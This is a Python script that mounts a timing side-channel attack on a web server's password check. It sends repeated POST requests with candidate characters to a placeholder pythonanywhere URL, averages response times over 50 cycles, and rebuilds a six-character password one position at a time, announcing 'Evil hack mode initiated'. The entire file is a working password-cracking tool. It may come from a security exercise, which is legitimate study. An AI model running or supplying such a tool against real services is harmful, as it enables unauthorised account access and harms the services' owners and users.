import time
import requests
import statistics
from string import ascii_letters, digits

# Define constants
CHAR_SET = ascii_letters + digits  # Characters to try (A-Z, a-z, 0-9)
PASSWORD_LENGTH = 6  # Max password length
URL = "https://placeholder.pythonanywhere.com"  # URL of the server (replace with actual URL)
CYCLES = 50  # Number of cycles for statistical analysis

def measure_response_time(position, char):
    """Send a request and measure response time for a character at a given position."""
    password_attempt = ['.'] * PASSWORD_LENGTH
    password_attempt[position] = char
    payload = ''.join(password_attempt)

    print(f"[DEBUG] Measuring response time for payload: {payload}")
    start_time = time.time()
    response = requests.post(f"{URL}/{payload}")
    end_time = time.time()

    response_time = end_time - start_time
    response_text = response.text.strip()
    print(f"[DEBUG] Response time for '{char}' at position {position + 1}: {response_time:.6f} seconds, Server Response: {response_text}")

    return response_time, response_text

def find_character_for_position(position):
    """Find the character that is most different compared to others for a specific password position."""
    print(f"[DEBUG] Starting character search for position {position + 1}")
    response_times = {char: [] for char in CHAR_SET}

    for cycle in range(CYCLES):
        print(f"[DEBUG] Cycle {cycle + 1}/{CYCLES} for position {position + 1}")
        cycle_times = []
        for char in CHAR_SET:
            delay, response_text = measure_response_time(position, char)
            if response_text == '1':
                print(f"[DEBUG] Correct character '{char}' identified immediately for position {position + 1}")
                return char
            response_times[char].append(delay)
            cycle_times.append(delay)

    # Calculate average response time for each character and overall mean
    avg_times = {char: statistics.mean(times) for char, times in response_times.items()}
    overall_mean = statistics.mean(avg_times.values())

    # Calculate difference from overall mean for each character
    diff_from_mean = {char: abs(avg_time - overall_mean) for char, avg_time in avg_times.items()}
    for char, diff in diff_from_mean.items():
        print(f"[DEBUG] Difference from overall mean for '{char}' at position {position + 1}: {diff:.6f} seconds")

    # Find the character with the largest difference from the overall mean
    best_char = max(diff_from_mean, key=diff_from_mean.get)
    print(f"[DEBUG] Best character for position {position + 1} (most different from others): {best_char}")
    return best_char

def break_password():
    """Attempt to break the password using timing attack."""
    print("[DEBUG] Starting password breaking process")
    password = ['a'] * PASSWORD_LENGTH

    for position in range(PASSWORD_LENGTH):
        print(f"Finding character for position {position + 1}...")
        best_char = find_character_for_position(position)
        password[position] = best_char
        print(f"Identified character '{best_char}' for position {position + 1}")

    final_password = ''.join(password)
    print(f"[DEBUG] Password identified: {final_password}")
    print(f"Password identified: {final_password}")

if __name__ == "__main__":
    print(f'Evil hack mode initiated\n{"-"*10}\nTarget: {URL}')
    break_password()
